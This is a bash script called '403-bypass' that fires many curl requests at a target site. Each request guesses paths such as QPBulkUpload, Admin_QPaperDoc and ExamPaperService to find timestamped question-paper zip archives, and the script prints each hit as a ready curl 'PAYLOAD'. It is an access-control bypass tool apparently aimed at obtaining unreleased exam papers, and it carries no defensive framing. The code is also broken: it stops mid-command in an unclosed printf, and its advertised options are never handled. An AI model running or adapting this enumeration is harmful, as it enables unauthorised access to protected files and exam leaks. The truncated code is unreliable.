#!/bin/bash
#color
red='\e[31m'
green='\e[32m'
blue='\e[34m'
cyan='\e[96m'
ltcyan='\e[96m'
yellow='\e[33m'
black='\e[38;5;016m'
bluebg='\e[48;5;038m'${black}
end='\e[0m'
termwidth="$(tput cols)"
function print(){
	status=$(echo ${code} | awk '{print $2}'|sed 's/,$//g')
	if [[ ${status} =~ 2.. ]];then
			printf "${green} ${code} ${end} 👌\n${payload}\n"
	elif [[ ${status} =~ 3.. ]]; then
			printf "${yellow} ${code} ${end}\n"
	elif [[ ${status} =~ 5.. ]]; then
			printf "${ltcyan} ${code} ${end}\n"
	else
			printf "${red} ${code} ${end}\n"
	fi
}
function banner(){
	echo "💀💀💀💀💀💀💀💀💀"
	echo -e "💀$green Have a beer🍺💀 $end"
}
function usage(){
        printf "Usage:\n"
        printf "\t403-bypass [URL]\n">&2
        printf '\n' >&2
        printf "\t-u, --url URL\t\t\ttarget DOMAIN.TLD/PATH\n">&2
		printf '\n' >&2
		printf "BYPASS MODEs\n">&2
		printf "\t--encode\t\t\tURL Encode Bypass\n">&2\
		printf '\n' >&2
		printf "ALL BYPASSES\n">&2
		printf "\t--exploit\t\t\tComplete Scan: 403/401 bypass modes \n">&2
		printf '\n' >&2
		printf "\t${green}GREEN${end}\t:\t${green}2xx Status Code${end}\n">&2
		printf "\t${yellow}YELLOW${end}\t:\t${yellow}3xx Status Code${end}\n">&2
		printf "\t${red}RED${end}\t:\t${red}4xx Status Code${end}\n">&2
		printf "\t${ltcyan}BLUE${end}\t:\t${ltcyan}5xx Status Code${end}\n">&2
}
function URL_Encode_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] URL Encode Bypass "${end}
	echo -e ${blue}"----------------------"${end}
	
	echo -n "Payload [QP02_12_2023%2008_53_31.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_31.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_31.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_32.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_32.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_32.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_33.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_33.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_33.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
 
echo -n "Payload [QPBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessingQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessingQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessingQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataPortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PManagement/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataFileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
